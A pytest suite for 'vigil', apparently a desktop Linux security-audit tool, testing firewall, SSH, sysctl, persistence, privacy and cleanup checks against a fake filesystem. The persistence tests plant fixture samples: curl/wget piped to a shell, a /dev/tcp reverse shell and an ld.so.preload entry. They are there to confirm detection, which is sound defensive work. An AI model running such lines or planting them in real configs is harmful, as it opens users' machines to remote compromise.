"""Tests for bin/vigil. Run with: python3 -m pytest tests -q

Every check runs against a fake filesystem under tmp_path: vigil.ROOT is the
prefix for /etc, /proc, /sys and /var, vigil.HOME is a fake home directory,
and systemctl / child processes are replaced with fakes.
"""
import base64
import importlib.machinery
import importlib.util
import json
import os
import re
import stat
import struct
import threading
import time
from pathlib import Path

import sys

import pytest

sys.dont_write_bytecode = True          # keep bin/ free of __pycache__
REPO = Path(__file__).resolve().parents[1]


def load_vigil():
    loader = importlib.machinery.SourceFileLoader("vigil", str(REPO / "bin" / "vigil"))
    spec = importlib.util.spec_from_loader("vigil", loader)
    mod = importlib.util.module_from_spec(spec)
    loader.exec_module(mod)
    return mod


@pytest.fixture
def v(tmp_path, monkeypatch):
    mod = load_vigil()
    root = tmp_path / "root"
    home = tmp_path / "home"
    root.mkdir()
    home.mkdir(mode=0o700)
    mod.ROOT = str(root)
    mod.HOME = str(home)
    mod.USER = "alice"
    units = {}
    mod.UNITS = units

    def fake_systemctl(*args):
        if args[0] in ("is-active", "is-enabled"):
            return units.get((args[0], args[1]), "inactive" if args[0] == "is-active" else "disabled")
        return ""

    # Replace the memoised wrapper itself, so tests can change units mid-test.
    monkeypatch.setattr(mod, "systemctl", fake_systemctl)
    commands = {}
    mod.COMMANDS = commands

    def fake_run(argv, timeout=8, limit=0, on_line=None, raw=False, env=None):
        envs.append(env)
        key = tuple(argv)
        # The confirming rescan passes its paths in a private list file; the
        # tests describe it by those paths, as if they were arguments.
        conf = "--file-list=" + os.path.join(mod.HOME, *mod.STATE_DIR, mod.CONFIRM_LIST)
        if key and key[-1] == conf:
            with open(conf[len("--file-list="):], encoding="utf-8", errors="surrogateescape") as fh:
                listed = fh.read().splitlines()
            mod.CONFIRM_SEEN.append((tuple(argv), listed, os.stat(conf[len("--file-list="):]).st_mode & 0o777))
            key = key[:-1] + ("--",) + tuple(listed)
        if key not in commands:
            return None, b"" if raw else ""
        rc, out = commands[key]
        if on_line is not None and rc is not None:      # stream like the real run(): keep what on_line wants
            out = "".join(l + "\n" for l in out.splitlines() if on_line(l))
        return rc, out

    envs = []
    mod.ENVS = envs
    mod.CONFIRM_SEEN = []
    monkeypatch.setattr(mod, "run", fake_run)
    trusted = set()
    mod.TRUSTED = trusted
    monkeypatch.setattr(mod, "is_trusted_executable", lambda p: p in trusted)
    return mod


def put(path, text, mode=0o644):
    path = Path(path)
    path.parent.mkdir(parents=True, exist_ok=True)
    path.write_text(text)
    os.chmod(path, mode)
    return path


def sysfile(v, rel, text, mode=0o644):
    return put(v.ROOT + rel, text, mode)


def homefile(v, rel, text, mode=0o644):
    return put(os.path.join(v.HOME, rel), text, mode)


# --------------------------------------------------------------------------
# Safe file reading

def test_read_file_refuses_symlink(v, tmp_path):
    target = put(tmp_path / "secret", "x")
    link = tmp_path / "link"
    link.symlink_to(target)
    with pytest.raises(v.Refused):
        v.read_file(str(link))
    assert v.read_file(str(link), follow=True) == b"x"


def test_read_file_does_not_hang_on_fifo(v, tmp_path):
    fifo = tmp_path / "fifo"
    os.mkfifo(fifo)
    done = []

    def go():
        try:
            v.read_file(str(fifo), follow=True)
        except v.Refused:
            done.append("refused")

    t = threading.Thread(target=go, daemon=True)
    t.start()
    t.join(3)
    assert done == ["refused"]


def test_read_file_rejects_oversize(v, tmp_path):
    p = put(tmp_path / "big", "a" * 101)
    with pytest.raises(v.Refused):
        v.read_file(str(p), limit=100)
    assert v.read_file(str(p), limit=101) == b"a" * 101


def test_read_file_missing_is_none(v, tmp_path):
    assert v.read_file(str(tmp_path / "nope")) is None


def test_clean_strips_controls_and_caps(v):
    s = v.clean("a\x1b[31mb‮c" + "x" * 500, 20)
    assert "\x1b" not in s and "‮" not in s and len(s) <= 20


# --------------------------------------------------------------------------
# Running commands (real subprocesses)

def test_run_rejects_relative_argv():
    mod = load_vigil()
    assert mod.run(["sh", "-c", "true"]) == (None, "")


def test_run_caps_output():
    mod = load_vigil()
    rc, out = mod.run(["/usr/bin/yes"], timeout=5, limit=1000)
    assert rc is None and out == ""


def test_run_times_out():
    mod = load_vigil()
    rc, _ = mod.run(["/usr/bin/sleep", "5"], timeout=0.5)
    assert rc is None


def test_run_ok():
    mod = load_vigil()
    assert mod.run(["/usr/bin/printf", "hi"]) == (0, "hi")


# --------------------------------------------------------------------------
# Harden checks

def ufw(v, enabled="yes", policy="DROP", active="active"):
    sysfile(v, "/etc/ufw/ufw.conf", "ENABLED=%s\n" % enabled)
    sysfile(v, "/etc/default/ufw", 'DEFAULT_INPUT_POLICY="%s"\n' % policy)
    sysfile(v, "/usr/bin/ufw", "")
    v.UNITS[("is-active", "ufw.service")] = active


def test_firewall_pass(v):
    ufw(v)
    assert v.check_firewall()["status"] == "pass"


def test_firewall_off(v):
    ufw(v, enabled="no", active="inactive")
    c = v.check_firewall()
    assert c["status"] == "fail" and c["fix"]["action"] == "firewall-on"


def test_firewall_accepting(v):
    ufw(v, policy="ACCEPT")
    assert v.check_firewall()["status"] == "warn"


def test_firewall_missing(v):
    c = v.check_firewall()
    assert c["status"] == "fail" and c["fix"]["action"] == "install-ufw"


def test_firewall_nftables_counts(v):
    v.UNITS[("is-active", "nftables.service")] = "active"
    assert v.check_firewall()["status"] == "pass"


def test_kernel_sysctl(v):
    for name, _, rec, _ in v.KERNEL_SYSCTLS:
        sysfile(v, "/proc/sys/" + name.replace(".", "/"), "%d\n" % rec)
    assert v.check_kernel_sysctl()["status"] == "pass"
    sysfile(v, "/proc/sys/kernel/kptr_restrict", "0\n")
    c = v.check_kernel_sysctl()
    assert c["status"] == "warn" and "kptr_restrict" in c["detail"] and c["fix"]["action"] == "sysctl-harden"


def test_kernel_sysctl_unreadable(v):
    assert v.check_kernel_sysctl()["status"] == "unknown"


def test_llmnr(v):
    v.UNITS[("is-active", "systemd-resolved.service")] = "active"
    assert v.check_llmnr()["status"] == "warn"
    sysfile(v, "/etc/systemd/resolved.conf.d/90-x.conf", "[Resolve]\nLLMNR=no\n")
    assert v.check_llmnr()["status"] == "pass"


def test_ssh_server_off(v):
    assert v.check_ssh_server()["status"] == "pass"


def test_ssh_server_dropin_wins(v):
    v.UNITS[("is-active", "sshd.service")] = "active"
    sysfile(v, "/etc/ssh/sshd_config", "PasswordAuthentication yes\nPermitRootLogin yes\n")
    assert v.check_ssh_server()["status"] == "fail"
    sysfile(v, "/etc/ssh/sshd_config.d/00-a.conf",
            "PermitRootLogin no\nPasswordAuthentication no\nKbdInteractiveAuthentication no\n")
    assert v.check_ssh_server()["status"] == "pass"


def test_ssh_server_ignores_match_blocks(v):
    v.UNITS[("is-active", "sshd.service")] = "active"
    sysfile(v, "/etc/ssh/sshd_config",
            "PasswordAuthentication no\nKbdInteractiveAuthentication no\nMatch User bob\n  PermitRootLogin yes\n")
    assert v.check_ssh_server()["status"] == "pass"


def ssh_string(b):
    return struct.pack(">I", len(b)) + b


def openssh_key(cipher=b"none", ktype=b"ssh-ed25519"):
    pub = ssh_string(ktype) + ssh_string(b"\x00" * 32)
    blob = (b"openssh-key-v1\x00" + ssh_string(cipher) + ssh_string(b"none" if cipher == b"none" else b"bcrypt")
            + ssh_string(b"") + struct.pack(">I", 1) + ssh_string(pub) + ssh_string(b"\x00" * 64))
    body = base64.b64encode(blob).decode()
    return "-----BEGIN OPENSSH PRIVATE KEY-----\n%s\n-----END OPENSSH PRIVATE KEY-----\n" % body


def test_private_key_parser(v):
    assert v._private_key_state(openssh_key().encode())[:2] == (True, False)
    assert v._private_key_state(openssh_key(b"aes256-ctr").encode())[:2] == (True, True)
    assert v._private_key_state(openssh_key(ktype=b"sk-ssh-ed25519@openssh.com").encode())[:2] == (True, True)
    pem = "-----BEGIN RSA PRIVATE KEY-----\nProc-Type: 4,ENCRYPTED\nabc\n-----END RSA PRIVATE KEY-----\n"
    assert v._private_key_state(pem.encode())[:2] == (True, True)
    assert v._private_key_state(b"-----BEGIN PRIVATE KEY-----\nabc\n-----END PRIVATE KEY-----\n")[:2] == (True, False)
    assert v._private_key_state(b"ssh-ed25519 AAAA user@host\n")[0] is False
    # Truncated or garbage blobs never raise.
    assert v._private_key_state(b"-----BEGIN OPENSSH PRIVATE KEY-----\nAAAA\n-----END")[0] is True


def test_ssh_keys_statuses(v):
    assert v.check_ssh_keys()["status"] == "na"
    os.mkdir(os.path.join(v.HOME, ".ssh"), 0o700)
    homefile(v, ".ssh/id_ed25519", openssh_key(b"aes256-ctr"), 0o600)
    homefile(v, ".ssh/id_ed25519.pub", "ssh-ed25519 AAAA me", 0o644)
    assert v.check_ssh_keys()["status"] == "pass"
    homefile(v, ".ssh/id_work", openssh_key(), 0o600)
    assert v.check_ssh_keys()["status"] == "warn"
    os.chmod(os.path.join(v.HOME, ".ssh/id_work"), 0o644)
    c = v.check_ssh_keys()
    assert c["status"] == "fail" and c["fix"]["action"] == "ssh-perms"


def test_fix_ssh_perms_only_touches_keys_and_never_follows_links(v, tmp_path):
    os.mkdir(os.path.join(v.HOME, ".ssh"), 0o755)
    key = homefile(v, ".ssh/id_ed25519", openssh_key(), 0o644)
    pub = homefile(v, ".ssh/id_ed25519.pub", "ssh-ed25519 AAAA me", 0o644)
    outside = put(tmp_path / "outside_key", openssh_key(), 0o644)
    os.symlink(outside, os.path.join(v.HOME, ".ssh", "linked"))
    res = v.run_fix("ssh-perms")
    assert res["ok"], res
    assert stat.S_IMODE(os.stat(os.path.join(v.HOME, ".ssh")).st_mode) == 0o700
    assert stat.S_IMODE(key.stat().st_mode) == 0o600
    assert stat.S_IMODE(pub.stat().st_mode) == 0o644
    assert stat.S_IMODE(outside.stat().st_mode) == 0o644


def test_fix_refuses_symlinked_ssh_dir(v, tmp_path):
    real = tmp_path / "elsewhere"
    real.mkdir(mode=0o755)
    os.symlink(real, os.path.join(v.HOME, ".ssh"))
    res = v.run_fix("ssh-perms")
    assert not res["ok"]
    assert stat.S_IMODE(real.stat().st_mode) == 0o755


def test_gnupg(v):
    assert v.check_gnupg()["status"] == "na"
    os.mkdir(os.path.join(v.HOME, ".gnupg"), 0o755)
    os.chmod(os.path.join(v.HOME, ".gnupg"), 0o755)
    assert v.check_gnupg()["status"] == "warn"
    assert v.run_fix("gnupg-perms")["ok"]
    assert v.check_gnupg()["status"] == "pass"


def test_screen_lock(v):
    assert v.check_screen_lock()["status"] == "unknown"
    homefile(v, ".config/omarchy/shell.json", json.dumps({"version": 1, "idle": {"lock": 300}}))
    assert v.check_screen_lock()["status"] == "pass"
    homefile(v, ".config/omarchy/shell.json", json.dumps({"version": 1, "idle": {"lock": 3600}}))
    assert v.check_screen_lock()["status"] == "warn"
    homefile(v, ".config/omarchy/shell.json", json.dumps({"version": 1, "idle": {}}))
    assert v.check_screen_lock()["status"] == "warn"
    homefile(v, ".config/omarchy/shell.json", json.dumps({"version": 1, "idle": {"lock": 300}}))
    homefile(v, ".local/state/omarchy/indicators/stay-awake", "")
    c = v.check_screen_lock()
    assert c["status"] == "warn" and c["fix"]["action"] == "allow-idle"


def test_faillock(v):
    assert v.check_faillock()["status"] == "na"
    sysfile(v, "/etc/pam.d/system-auth",
            "auth required pam_faillock.so preauth silent deny=10 unlock_time=120\n")
    c = v.check_faillock()
    assert c["status"] == "pass" and "10" in c["summary"]
    sysfile(v, "/etc/pam.d/system-auth", "auth required pam_unix.so\n")
    assert v.check_faillock()["status"] == "warn"


def test_passwordless_sudo(v):
    assert v.check_passwordless_sudo()["status"] == "na"
    v.TRUSTED.add(v.ROOT + "/usr/bin/omarchy-sudo-passwordless")
    v.COMMANDS[("/usr/bin/omarchy-sudo-passwordless", "--active")] = (0, "")
    assert v.check_passwordless_sudo()["status"] == "fail"
    v.COMMANDS[("/usr/bin/omarchy-sudo-passwordless", "--active")] = (1, "")
    assert v.check_passwordless_sudo()["status"] == "pass"


def test_docker_group(v):
    sysfile(v, "/etc/group", "wheel:x:998:alice\ndocker:x:970:bob,alice\n")
    assert v.check_docker_group()["status"] == "warn"
    sysfile(v, "/etc/group", "docker:x:970:bob,alicex\n")
    assert v.check_docker_group()["status"] == "pass"


def test_updates(v):
    import time as _t
    today = _t.strftime("%Y-%m-%d")
    sysfile(v, "/var/log/pacman.log", "[%sT10:00:00+0000] [PACMAN] starting full system upgrade\n" % today)
    assert v.check_updates()["status"] == "pass"
    sysfile(v, "/var/log/pacman.log", "[2020-01-01T10:00:00+0000] [PACMAN] starting full system upgrade\n")
    assert v.check_updates()["status"] == "fail"



def test_listeners_skip_loopback(v):
    tcp = ("  sl  local_address rem_address   st\n"
           "   0: 0100007F:0277 00000000:0000 0A\n"          # 127.0.0.1:631
           "   1: 3500007F:0035 00000000:0000 0A\n"          # 127.0.0.53:53
           "   2: 00000000:0016 00000000:0000 0A\n"          # 0.0.0.0:22
           "   3: 00000000:1F90 00000000:0000 01\n")         # established, ignored
    tcp6 = ("  sl  local_address rem_address st\n"
            "   0: 00000000000000000000000001000000:1F90 00000000000000000000000000000000:0000 0A\n"
            "   1: 00000000000000000000000000000000:D125 00000000000000000000000000000000:0000 0A\n")
    sysfile(v, "/proc/net/tcp", tcp)
    sysfile(v, "/proc/net/tcp6", tcp6)
    assert v._listeners() == [("tcp", 22), ("tcp", 53541)]
    c = v.check_listeners()
    assert c["status"] == "warn" and "22" in c["detail"]


# --------------------------------------------------------------------------
# Scan checks

def test_persistence_flags_download_and_run(v):
    homefile(v, ".bashrc", "# curl https://x | sh is fine in a comment\nalias ll='ls -l'\n")
    assert v.check_persistence()["status"] == "pass"
    homefile(v, ".config/autostart/updater.desktop",
             "[Desktop Entry]\nExec=sh -c 'curl -fsSL https://evil.example/x | bash'\n")
    c = v.check_persistence()
    assert c["status"] == "warn" and "autostart/updater.desktop:2" in c["detail"]


def test_persistence_follows_dotfile_symlink(v, tmp_path):
    real = put(tmp_path / "dotfiles" / "bashrc", "bash -i >& /dev/tcp/10.0.0.1/4444 0>&1\n")
    os.symlink(real, os.path.join(v.HOME, ".bashrc"))
    assert v.check_persistence()["status"] == "warn"


def test_persistence_crontab(v):
    v.TRUSTED.add(v.ROOT + "/usr/bin/crontab")
    v.COMMANDS[("/usr/bin/crontab", "-l")] = (0, "*/5 * * * * wget -qO- http://x/y | sh\n")
    c = v.check_persistence()
    assert c["status"] == "warn" and "crontab:1" in c["detail"]


def test_ld_preload(v):
    assert v.check_ld_preload()["status"] == "pass"
    sysfile(v, "/etc/ld.so.preload", "# comment\n")
    assert v.check_ld_preload()["status"] == "pass"
    sysfile(v, "/etc/ld.so.preload", "/usr/lib/libevil.so\n")
    assert v.check_ld_preload()["status"] == "fail"



# --------------------------------------------------------------------------
# Privacy checks

def test_dns_fallback(v):
    v.UNITS[("is-active", "systemd-resolved.service")] = "active"
    assert v.check_dns_fallback()["status"] == "warn"
    sysfile(v, "/etc/systemd/resolved.conf.d/90-x.conf", "[Resolve]\nFallbackDNS=\n")
    assert v.check_dns_fallback()["status"] == "pass"


def test_connectivity_and_mac(v):
    v.UNITS[("is-active", "NetworkManager.service")] = "active"
    sysfile(v, "/usr/lib/NetworkManager/conf.d/20-connectivity.conf",
            "[connectivity]\nuri=http://ping.archlinux.org/nm-check.txt\n")
    assert v.check_connectivity_check()["status"] == "info"
    sysfile(v, "/etc/NetworkManager/conf.d/90-x.conf", "[connectivity]\nenabled=false\n")
    assert v.check_connectivity_check()["status"] == "pass"
    assert v.check_mac_randomization()["status"] == "warn"
    sysfile(v, "/etc/NetworkManager/conf.d/91-x.conf", "[connection]\nwifi.cloned-mac-address=stable\n")
    assert v.check_mac_randomization()["status"] == "pass"


def test_avahi(v):
    assert v.check_avahi()["status"] == "pass"
    v.UNITS[("is-active", "avahi-daemon.service")] = "active"
    sysfile(v, "/etc/avahi/avahi-daemon.conf", "[publish]\n#disable-publishing=no\n")
    assert v.check_avahi()["status"] == "warn"
    sysfile(v, "/etc/avahi/avahi-daemon.conf", "[publish]\ndisable-publishing=yes\n")
    assert v.check_avahi()["status"] == "pass"


def test_optout_roundtrip(v):
    assert v.check_opt_out()["status"] == "info"
    assert v.run_fix("optout-on")["ok"]
    path = Path(v.HOME, ".config/uwsm/env.d", v.OPT_OUT_NAME)
    assert path.read_text() == v.OPT_OUT_TEXT
    assert v.check_opt_out()["fix"]["action"] == "optout-off"
    assert v.run_fix("optout-off")["ok"]
    assert not path.exists()


def test_optout_off_leaves_edited_file(v):
    v.run_fix("optout-on")
    path = Path(v.HOME, ".config/uwsm/env.d", v.OPT_OUT_NAME)
    path.write_text(v.OPT_OUT_TEXT + "export MINE=1\n")
    res = v.run_fix("optout-off")
    assert not res["ok"] and path.exists()


def test_optout_on_does_not_write_through_symlink(v, tmp_path):
    victim = put(tmp_path / "victim", "must survive")
    d = Path(v.HOME, ".config/uwsm/env.d")
    d.mkdir(parents=True)
    os.symlink(victim, d / v.OPT_OUT_NAME)
    assert v.run_fix("optout-on")["ok"]
    assert victim.read_text() == "must survive"
    assert not (d / v.OPT_OUT_NAME).is_symlink()


# --------------------------------------------------------------------------
# Clean

def test_clean_thumbnails_stays_inside(v, tmp_path):
    keep = tmp_path / "keep"
    keep.mkdir()
    put(keep / "precious.png", "x")
    thumbs = Path(v.HOME, ".cache/thumbnails")
    put(thumbs / "large" / "a.png", "x")
    put(thumbs / "normal" / "b.png", "x")
    os.symlink(keep, thumbs / "escape")
    res = v.run_fix("clean-thumbnails")
    assert res["ok"], res
    assert (keep / "precious.png").exists()
    assert list(thumbs.iterdir()) == []


DAY = 86400


def aged(path, days):
    t = time.time() - days * DAY
    os.utime(path, (t, t), follow_symlinks=False)
    return path


def test_empty_trash_needs_no_desktop_session(v, tmp_path):
    outside = put(tmp_path / "outside.txt", "keep me")
    trash = Path(v.HOME, ".local/share/Trash")
    put(trash / "files" / "old.txt", "x")
    put(trash / "info" / "old.txt.trashinfo", "[Trash Info]")
    put(trash / "files" / "project" / "ro" / "obj", "x")
    os.chmod(trash / "files" / "project" / "ro", 0o555)          # e.g. a Go module folder
    os.symlink(outside, trash / "files" / "link")
    put(trash / "directorysizes", "1 2 project")
    res = v.run_fix("empty-trash")
    assert res["ok"] and res["message"] == "Trash emptied.", res
    assert list((trash / "files").iterdir()) == [] and list((trash / "info").iterdir()) == []
    assert not (trash / "directorysizes").exists()
    assert outside.read_text() == "keep me"
    assert v.check_trash()["status"] == "pass"


def test_clean_app_cache_keeps_what_is_in_use(v, tmp_path):
    outside = put(tmp_path / "outside.bin", "keep me")
    cache = Path(v.HOME, ".cache")
    old = aged(put(cache / "app" / "old.bin", "x" * 2_000_000), 10)
    new = put(cache / "app" / "new.bin", "x" * 2_000_000)
    stale_dir = put(cache / "gone" / "deep" / "f", "x" * 10)
    aged(stale_dir, 30); aged(stale_dir.parent, 30); aged(stale_dir.parent.parent, 30)
    thumb = aged(put(cache / "thumbnails" / "normal" / "t.png", "x"), 30)
    link = cache / "app" / "link"
    os.symlink(outside, link); aged(link, 30)
    aged(cache / "app", 30)
    c = v.check_user_cache()
    assert c["status"] == "info" and "not used in the past week" in c["summary"], c
    assert c["fix"]["action"] == "clean-app-cache"
    res = v.run_fix("clean-app-cache")
    assert res["ok"] and res["message"].startswith("Freed "), res
    assert not old.exists() and new.exists() and thumb.exists()
    assert not (cache / "gone").exists()
    assert not os.path.lexists(link) and outside.read_text() == "keep me"
    assert (cache / "app").exists()                                  # still holds new.bin
    assert v.check_user_cache()["status"] == "pass"


def test_clean_user_runs_every_no_root_cleanup(v):
    thumbs = Path(v.HOME, ".cache/thumbnails")
    put(thumbs / "normal" / "a.png", "x")
    put(Path(v.HOME, ".local/share/Trash/files/old.txt"), "x" * 5000)
    aged(put(Path(v.HOME, ".cache/app/old.bin"), "x" * 2_000_000), 10)
    res = v.run_fix("clean-user")
    assert res["ok"], res
    assert "Removed 1 thumbnail" in res["message"] and "Trash emptied" in res["message"]
    assert "Freed" in res["message"]
    assert list(thumbs.iterdir()) == []


def test_clean_user_on_a_tidy_home(v):
    res = v.run_fix("clean-user")
    assert res["ok"] and "trash" not in res["message"].lower() and "cache" not in res["message"].lower(), res


PACCACHE = "/usr/bin/paccache"


def test_pacman_cache_reports_what_can_be_freed(v):
    sysfile(v, "/var/cache/pacman/pkg/a-1-1-x86_64.pkg.tar.zst", "x" * 50000)
    assert "Could not work out" in v.check_pacman_cache()["summary"]          # no paccache
    v.TRUSTED.add(v.sys_path(PACCACHE))
    v.COMMANDS[(PACCACHE, "-d", "-k2", "--nocolor")] = (0, "\n==> no candidate packages found for pruning\n")
    v.COMMANDS[(PACCACHE, "-d", "-u", "-k0", "--nocolor")] = (
        0, "\n==> finished dry run: 3 candidates (disk space saved: 1.50 GiB)\n")
    c = v.check_pacman_cache()
    assert c["summary"].endswith("1.5 GB can be freed."), c
    assert c["fix"] == {"kind": "terminal", "action": "clean-pacman-cache", "label": "Free 1.5 GB"}
    v.COMMANDS[(PACCACHE, "-d", "-u", "-k0", "--nocolor")] = (0, "==> no candidate packages found for pruning")
    c = v.check_pacman_cache()
    assert c["status"] == "pass" and "kept for rollback" in c["summary"] and c["fix"]["kind"] == "none"


def test_size_checks(v):
    assert v.check_thumbnails()["status"] == "pass"
    put(Path(v.HOME, ".cache/thumbnails/normal/a.png"), "x" * 10000)
    c = v.check_thumbnails()
    assert c["status"] == "info" and c["fix"]["action"] == "clean-thumbnails"


def test_unknown_fix_refused(v):
    assert v.run_fix("rm-rf")["ok"] is False


# --------------------------------------------------------------------------
# State

def test_state_reports_new_findings_after_baseline(v):
    ufw(v, enabled="no", active="inactive")
    first = v.audit()
    assert first["stateSaved"] and first["new"] == []
    sysfile(v, "/etc/ld.so.preload", "/usr/lib/libevil.so\n")
    second = v.audit()
    assert "ld-preload" in second["new"] and "firewall" not in second["new"]
    assert v.audit()["new"] == []
    st = os.stat(os.path.join(v.HOME, ".local/state/omarchy-vigil/state.json"))
    assert stat.S_IMODE(st.st_mode) == 0o600


def test_peek_does_not_touch_state(v):
    v.audit(peek=True)
    assert not os.path.exists(os.path.join(v.HOME, ".local/state/omarchy-vigil"))


def test_state_write_replaces_planted_symlink(v, tmp_path):
    victim = put(tmp_path / "victim", "must survive")
    d = Path(v.HOME, ".local/state/omarchy-vigil")
    d.mkdir(parents=True, mode=0o700)
    os.symlink(victim, d / "state.json")
    v.audit()
    assert victim.read_text() == "must survive"


def test_state_refuses_symlinked_directory(v, tmp_path):
    elsewhere = tmp_path / "elsewhere"
    elsewhere.mkdir()
    Path(v.HOME, ".local/state").mkdir(parents=True)
    os.symlink(elsewhere, Path(v.HOME, ".local/state/omarchy-vigil"))
    report = v.audit()
    assert report["stateSaved"] is False
    assert list(elsewhere.iterdir()) == []


# --------------------------------------------------------------------------
# Report shape and the contract with Model.js

def model_actions():
    src = (REPO / "Model.js").read_text()
    terminal = set(re.findall(r'^  "([a-z0-9-]+)": \{\n    title:', src, re.M))
    helper = set(re.findall(r'"([a-z0-9-]+)"', re.search(r"var HELPER_ACTIONS = \[(.*?)\]", src, re.S).group(1)))
    return terminal, helper


def test_every_fix_in_helper_is_known_to_model(v):
    terminal, helper = model_actions()
    src = (REPO / "bin" / "vigil").read_text()
    used_terminal = set(re.findall(r'"terminal", "([a-z0-9-]+)"', src))
    used_helper = set(re.findall(r'"helper", "([a-z0-9-]+)"', src))
    used_app = set(re.findall(r'"app", "([a-z0-9-]+)"', src))
    msrc = (REPO / "Model.js").read_text()
    for a in used_app:
        assert '"%s": {\n    app:' % a in msrc, a
    for spec in v.SCANNERS:
        used_terminal |= {a for a in (spec[5], spec[6]) if a}
    assert used_terminal <= terminal, used_terminal - terminal
    assert used_helper <= helper, used_helper - helper
    assert helper == set(v.FIXES)


def test_full_audit_shape(v):
    report = v.audit()
    json.dumps(report)
    ids = [c["id"] for c in report["checks"]]
    assert len(ids) == len(set(ids)) and len(ids) <= 160
    for c in report["checks"]:
        assert re.fullmatch(r"[a-z0-9-]{1,40}", c["id"])
        assert c["category"] in ("harden", "detect", "supply", "privacy", "care")
        assert c["status"] in ("pass", "warn", "fail", "info", "na", "unknown")
        assert c["fix"]["kind"] in ("terminal", "helper", "app", "docs", "none")
        assert isinstance(c["weight"], int) and 0 <= c["weight"] <= 3
        assert len(c["summary"]) <= 240 and len(c["why"]) <= 400 and len(c["howto"]) <= 400
        # Every open finding has a button, and can be marked as reviewed.
        if c["status"] in ("warn", "fail", "info"):
            assert c["fix"]["kind"] != "none", c["id"]
        assert c["dismissible"] == (c["status"] not in ("pass", "na")), c["id"]
        if c["status"] == "unknown":
            assert c["howto"], c["id"]
    assert 0 <= report["score"] <= 100


def test_cli_rejects_bad_arguments():
    import subprocess
    vigil = str(REPO / "bin" / "vigil")
    for args in (["fix", "../../x"], ["fix"], ["audit", "--force"], []):
        p = subprocess.run(["/usr/bin/python3", "-I", "-S", vigil] + args, capture_output=True, timeout=30)
        assert p.returncode == 2, args


# --------------------------------------------------------------------------
# Pillars: ClamUI hand-off, Bumblebee, plugin inventory

def test_categories_match_pillars(v):
    cats = {c["category"] for c in v.audit(peek=True)["checks"]}
    assert cats == {"harden", "detect", "supply", "privacy", "care"}


def test_clamui_detection(v):
    c = v.check_clamui()
    assert c["status"] == "info" and c["fix"] == {"kind": "terminal", "action": "install-clamui", "label": "Install ClamUI"}
    v.TRUSTED.add(v.ROOT + "/usr/bin/flatpak")
    os.makedirs(os.path.join(v.HOME, ".local/share/flatpak/app/io.github.linx_systems.ClamUI/current"))
    assert v.clamui_install() == "flatpak"
    c = v.check_clamui()
    assert c["status"] == "pass" and c["fix"]["kind"] == "app" and c["fix"]["action"] == "open-clamui"
    v.TRUSTED.add(v.ROOT + "/usr/bin/clamui")
    assert v.clamui_install() == "native"
    assert v.audit(peek=True)["apps"] == {"clamui": "native"}


def test_flatpak_clamui_needs_trusted_flatpak(v):
    os.makedirs(os.path.join(v.HOME, ".local/share/flatpak/app/io.github.linx_systems.ClamUI/current"))
    assert v.clamui_install() == ""


def bumblebee(v, payload, raw=None):
    os.makedirs(os.path.join(v.HOME, ".config/omarchy/plugins", v.BUMBLEBEE_ID), exist_ok=True)
    homefile(v, ".local/state/omarchy/bumblebee/last-scan.json", raw if raw is not None else json.dumps(payload), 0o600)


def test_plugin_inventory(v):
    assert v.check_plugins()["status"] == "pass"
    base = os.path.join(v.HOME, ".config/omarchy/plugins")
    homefile(v, ".config/omarchy/plugins/acme.weather/manifest.json", json.dumps({"name": "<b>Weather</b>"}))
    homefile(v, ".config/omarchy/plugins/keasbeexd.vigil/manifest.json", json.dumps({"name": "Vigil"}))
    os.makedirs(os.path.join(base, "broken.plugin"))
    c = v.check_plugins()
    assert c["status"] == "info" and "2 third-party plugins" in c["summary"]
    assert "Vigil" not in c["detail"] and "acme.weather" in c["detail"] and "broken.plugin" in c["detail"]


# --------------------------------------------------------------------------
# Undo, reviewed warnings, score history

def test_etc_mark_matches_model(v):
    src = (REPO / "Model.js").read_text()
    assert 'var VIGIL_MARK = "%s"' % v.ETC_MARK in src


def test_undo_offered_only_for_vigil_owned_files(v):
    v.UNITS[("is-active", "systemd-resolved.service")] = "active"
    path = "/etc/systemd/resolved.conf.d/90-omarchy-vigil-llmnr.conf"
    sysfile(v, path, v.ETC_MARK + "\n[Resolve]\nLLMNR=no\n")
    llmnr = {c["id"]: c for c in v.audit(peek=True)["checks"]}["llmnr"]
    assert llmnr["status"] == "pass" and llmnr["undo"]["action"] == "undo-llmnr"
    sysfile(v, path, "# edited by hand\n" + v.ETC_MARK + "\n[Resolve]\nLLMNR=no\n")
    llmnr = {c["id"]: c for c in v.audit(peek=True)["checks"]}["llmnr"]
    assert llmnr["undo"]["action"] == ""


def test_undo_never_follows_symlink(v, tmp_path):
    real = put(tmp_path / "x.conf", "")
    real.write_text(v.ETC_MARK + "\n")
    os.makedirs(v.ROOT + "/etc/sysctl.d")
    os.symlink(real, v.ROOT + "/etc/sysctl.d/90-omarchy-vigil.conf")
    assert v.undo_available("undo-sysctl") is False


def test_sysctl_undo_shows_on_both_sysctl_checks(v):
    sysfile(v, "/etc/sysctl.d/90-omarchy-vigil.conf", v.ETC_MARK + "\nkernel.kptr_restrict=2\n")
    checks = {c["id"]: c for c in v.audit(peek=True)["checks"]}
    assert checks["kernel-hardening"]["undo"]["action"] == "undo-sysctl"
    assert checks["network-hardening"]["undo"]["action"] == "undo-sysctl"


def test_avahi_undo_needs_backup(v):
    assert v.undo_available("undo-avahi") is False
    sysfile(v, v.AVAHI_BACKUP, "[publish]\n")
    assert v.undo_available("undo-avahi") is True


def port_listening(v):
    sysfile(v, "/proc/net/tcp", "  sl local rem st\n   0: 00000000:0016 00000000:0000 0A\n")


def test_dismiss_warning_roundtrip(v):
    port_listening(v)
    before = v.audit()
    ports = {c["id"]: c for c in before["checks"]}["open-ports"]
    assert ports["status"] == "warn" and ports["dismissible"] and not ports["dismissed"]
    res = v.set_dismissed("open-ports", True)
    assert res["ok"], res
    after = v.audit()
    ports = {c["id"]: c for c in after["checks"]}["open-ports"]
    assert ports["dismissed"] and re.fullmatch(r"\d{4}-\d{2}-\d{2}", ports["dismissedAt"])
    assert after["score"] > before["score"] and after["counts"]["dismissed"] == 1
    assert v.set_dismissed("open-ports", False)["ok"]
    assert not {c["id"]: c for c in v.audit()["checks"]}["open-ports"]["dismissed"]


def test_dismissal_lapses_when_finding_changes(v):
    port_listening(v)
    v.audit()
    v.set_dismissed("open-ports", True)
    sysfile(v, "/proc/net/tcp", "  sl local rem st\n   0: 00000000:0016 00000000:0000 0A\n"
                                "   1: 00000000:1F90 00000000:0000 0A\n")
    report = v.audit()
    ports = {c["id"]: c for c in report["checks"]}["open-ports"]
    assert not ports["dismissed"] and "open-ports" in report["new"]


def test_every_open_finding_can_be_reviewed(v):
    ufw(v, enabled="no", active="inactive")
